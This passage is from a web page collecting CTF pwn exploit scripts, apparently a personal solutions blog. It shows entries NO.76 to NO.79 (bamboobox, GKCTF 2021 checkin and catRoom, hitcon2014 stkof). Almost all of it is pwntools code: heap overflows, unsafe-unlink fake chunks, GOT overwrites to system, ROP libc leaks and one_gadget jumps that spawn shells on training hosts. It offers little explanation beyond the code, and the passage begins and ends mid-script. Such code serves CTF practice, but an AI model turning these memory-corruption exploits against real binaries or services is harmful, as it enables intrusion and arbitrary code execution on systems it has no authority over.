class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">l32 = <span class="keyword">lambda</span>      :u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b  :p.sendlineafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b  :p.sendafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">lg  = <span class="keyword">lambda</span> name,data : p.success(name + <span class="string">&quot;: 0x%x&quot;</span> % data)</span><br><span class="line">se  = <span class="keyword">lambda</span> payload: p.send(payload)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : p.recv()</span><br><span class="line">sl  = <span class="keyword">lambda</span> payload: p.sendline(payload)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a     :p.recvuntil(<span class="built_in">str</span>(a))</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size, content</span>):</span></span><br><span class="line">sla(<span class="string">&#x27; :&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27; : &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">sla(<span class="string">&#x27;heap:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">sla(<span class="string">&#x27; :&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27; :&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">sla(<span class="string">&#x27; : &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">sla(<span class="string">&#x27; :&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27; :&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span>(<span class="params">idx</span>):</span></span><br><span class="line">sla(<span class="string">&#x27; :&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27; :&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">free = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">&#x27;cccc&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">&#x27;e&#x27;</span>*<span class="number">0x18</span>+p8(<span class="number">0x81</span>))</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line">size = <span class="string">&#x27;\x02&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">0x70</span>, <span class="string">&#x27;d&#x27;</span>*<span class="number">0x40</span>+p64(<span class="number">0x10</span>)+p64(elf.got[<span class="string">&#x27;free&#x27;</span>]))</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Content : &#x27;</span>)</span><br><span class="line">free_addr = u64(p.recvuntil(<span class="string">&#x27;Done&#x27;</span>)[:-<span class="number">5</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">system_addr = free_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>] - libc.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">lg(<span class="string">&#x27;free_addr&#x27;</span>, free_addr)</span><br><span class="line">lg(<span class="string">&#x27;system&#x27;</span>, system_addr)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,p64(system_addr))</span><br><span class="line">remove(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-76-hitcontraining-bamboobox-solve"><a href="#NO-76-hitcontraining-bamboobox-solve" class="headerlink" title="NO.76 hitcontraining_bamboobox_solve"></a>NO.76 hitcontraining_bamboobox_solve</h1><h3 id="exp-76"><a href="#exp-76" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./hitcontraining_bamboobox&#x27;</span>)<span class="comment">#,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc.so.6&#x27;&#125;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26994</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;hitcontraining_bamboobox&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">o_g = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">magic = [<span class="number">0x3c4b10</span>,<span class="number">0x3c67a8</span>,<span class="number">0x846c0</span>,<span class="number">0x45390</span>]<span class="comment">#malloc,free,realloc,system</span></span><br><span class="line">l64 = <span class="keyword">lambda</span>      :u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">l32 = <span class="keyword">lambda</span>      :u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b  :p.sendlineafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b  :p.sendafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">lg  = <span class="keyword">lambda</span> name,data : p.success(name + <span class="string">&quot;: 0x%x&quot;</span> % data)</span><br><span class="line">se  = <span class="keyword">lambda</span> payload: p.send(payload)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : p.recv()</span><br><span class="line">sl  = <span class="keyword">lambda</span> payload: p.sendline(payload)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a     :p.recvuntil(<span class="built_in">str</span>(a))</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">sla(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"><span class="comment"># s = p.recv()</span></span><br><span class="line"><span class="comment"># # print(s)</span></span><br><span class="line"><span class="comment"># print(s.split(str(idx-1)+&#x27; : &#x27;)[0])#.split(&#x27;\n&#x27;)[0])</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size, content</span>):</span></span><br><span class="line">sla(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">sa(<span class="string">&#x27;:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, size, content</span>):</span></span><br><span class="line">sla(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">sa(<span class="string">&#x27;:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">sla(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">magic = <span class="number">0x0000000000400D49</span></span><br><span class="line">heaplist = <span class="number">0x0000006020C8</span></span><br><span class="line">fake_chunk = <span class="number">0x6020ad</span></span><br><span class="line">ptr = <span class="number">0x6020c8</span></span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">fakeChunk = p64(<span class="number">0</span>)+p64(<span class="number">0x41</span>)+p64(ptr-<span class="number">0x18</span>)+p64(ptr-<span class="number">0x10</span>)</span><br><span class="line">fakeChunk += <span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0x40</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="built_in">len</span>(fakeChunk), fakeChunk)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0x40</span>)+p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>])</span><br><span class="line">edit(<span class="number">0</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">show()</span><br><span class="line">libc.address = l64() - libc.sym[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># add(0x70,&#x27;a&#x27;*0x20)</span></span><br><span class="line"><span class="comment"># add(0x70,&#x27;b&#x27;*0x20)</span></span><br><span class="line"><span class="comment"># add(0x70,&#x27;c&#x27;*0x20)</span></span><br><span class="line"><span class="comment"># add(0x70,&#x27;d&#x27;*0x20)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># free(2)</span></span><br><span class="line"><span class="comment"># # free(1)</span></span><br><span class="line"><span class="comment"># edit(1, 0x90, &#x27;a&#x27;*0x70+p64(0)+p64(0x81)+p64(fake_chunk)+p64(0))</span></span><br><span class="line"><span class="comment"># add(0x70, &#x27;e&#x27;)</span></span><br><span class="line"><span class="comment"># add(0x30,p64(0x40000000))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># edit(0, 0x8, p64(magic))</span></span><br><span class="line"><span class="comment"># p.sendline(&#x27;5&#x27;)</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0x8</span>, p64(libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">sl(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-77-GKCTF-2021-checkin-solve"><a href="#NO-77-GKCTF-2021-checkin-solve" class="headerlink" title="NO.77 [GKCTF 2021]checkin_solve"></a>NO.77 [GKCTF 2021]checkin_solve</h1><h3 id="exp-77"><a href="#exp-77" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./login&#x27;</span>,env=&#123;<span class="string">&#x27;LD_PRELOAD&#x27;</span>:<span class="string">&#x27;./libc.so.6&#x27;</span>&#125;)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29596</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;login&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = elf.libc</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">o_g = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">magic = [<span class="number">0x3c4b10</span>,<span class="number">0x3c67a8</span>,<span class="number">0x846c0</span>,<span class="number">0x45390</span>]<span class="comment">#malloc,free,realloc,system</span></span><br><span class="line">l64 = <span class="keyword">lambda</span>      :u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">l32 = <span class="keyword">lambda</span>      :u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b  :p.sendlineafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b  :p.sendafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">lg  = <span class="keyword">lambda</span> name,data : p.success(name + <span class="string">&quot;: 0x%x&quot;</span> % data)</span><br><span class="line">se  = <span class="keyword">lambda</span> payload: p.send(payload)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : p.recv()</span><br><span class="line">sl  = <span class="keyword">lambda</span> payload: p.sendline(payload)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a     :p.recvuntil(<span class="built_in">str</span>(a))</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000401ab3</span></span><br><span class="line">s1 = <span class="number">0x0000000000602400</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x00000000004018A1</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;admin\x00\x00\x00&#x27;</span>+p64(pop_rdi_ret)+p64(puts_got)+p64(main_addr)</span><br><span class="line">sa(<span class="string">&#x27;&gt;&#x27;</span>, payload)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;admin\x00\x00\x00&#x27;</span>+p64(<span class="number">0</span>)*<span class="number">3</span> + p64(s1)</span><br><span class="line">sa(<span class="string">&#x27;&gt;&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">puts_addr = l64()</span><br><span class="line">lib_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">lg(<span class="string">&#x27;puts_addr&#x27;</span>, puts_addr)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;admin\x00\x00\x00&#x27;</span>*<span class="number">3</span> + p64(lib_base + o_g[<span class="number">1</span>]) </span><br><span class="line">sa(<span class="string">&#x27;&gt;&#x27;</span>, payload)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">payload = <span class="string">&#x27;admin\x00\x00\x00&#x27;</span>*<span class="number">4</span> + p64(s1+<span class="number">0x8</span>)</span><br><span class="line">sa(<span class="string">&#x27;&gt;&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-78-GKCTF-2021-demo-catRoom-solve"><a href="#NO-78-GKCTF-2021-demo-catRoom-solve" class="headerlink" title="NO.78 [GKCTF 2021]demo_catRoom_solve"></a>NO.78 [GKCTF 2021]demo_catRoom_solve</h1><h3 id="exp-78"><a href="#exp-78" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line"><span class="comment"># p = process([&#x27;./client&#x27;, &#x27;127.0.0.1&#x27;, &#x27;9999&#x27;])</span></span><br><span class="line">p = process([<span class="string">&#x27;./client&#x27;</span>, <span class="string">&#x27;117.21.200.166&#x27;</span>, <span class="string">&#x27;29428&#x27;</span>])<span class="comment">#,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc.so.6&#x27;&#125;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26681</span>)</span><br><span class="line"><span class="comment">#elf = ELF(&#x27;&#x27;)</span></span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">o_g = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">magic = [<span class="number">0x3c4b10</span>,<span class="number">0x3c67a8</span>,<span class="number">0x846c0</span>,<span class="number">0x45390</span>]<span class="comment">#malloc,free,realloc,system</span></span><br><span class="line">l64 = <span class="keyword">lambda</span>      :u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">l32 = <span class="keyword">lambda</span>      :u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b  :p.sendlineafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b  :p.sendafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">lg  = <span class="keyword">lambda</span> name,data : p.success(name + <span class="string">&quot;: 0x%x&quot;</span> % data)</span><br><span class="line">se  = <span class="keyword">lambda</span> payload: p.send(payload)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : p.recv()</span><br><span class="line">sl  = <span class="keyword">lambda</span> payload: p.sendline(payload)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a     :p.recvuntil(<span class="built_in">str</span>(a))</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span>(<span class="params">name, pwd</span>):</span></span><br><span class="line">sla(<span class="string">&#x27;0 exit \n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;\n&#x27;</span>, name)</span><br><span class="line">sla(<span class="string">&#x27;\n&#x27;</span>, pwd)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>(<span class="params">name, pwd</span>):</span></span><br><span class="line">sla(<span class="string">&#x27;0 exit \n&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;name\n&#x27;</span>, name)</span><br><span class="line">sla(<span class="string">&#x27;passwd\n&#x27;</span>, pwd)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span>(<span class="params">name, pwd</span>):</span></span><br><span class="line">sla(<span class="string">&#x27;0 exit \n&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;name\n&#x27;</span>, name)</span><br><span class="line">sla(<span class="string">&#x27;passwd\n&#x27;</span>, pwd)</span><br><span class="line"></span><br><span class="line">register(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;a&#x27;</span>) <span class="comment">#1</span></span><br><span class="line">register(<span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;b&#x27;</span>) <span class="comment">#2</span></span><br><span class="line">register(<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;c&#x27;</span>) <span class="comment">#3</span></span><br><span class="line">remove(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">register(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>, <span class="string">&#x27;b&#x27;</span>*<span class="number">0x30</span>+<span class="string">&#x27;admin&#x27;</span>)<span class="comment"># overloping user 2`s name :</span></span><br><span class="line">login(<span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-79-hitcon2014-stkof-solve"><a href="#NO-79-hitcon2014-stkof-solve" class="headerlink" title="NO.79 hitcon2014_stkof_solve"></a>NO.79 hitcon2014_stkof_solve</h1><h3 id="exp-79"><a href="#exp-79" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./hitcon2014_stkof&#x27;</span>)<span class="comment">#,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc.so.6&#x27;&#125;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29954</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;hitcon2014_stkof&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">o_g = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span 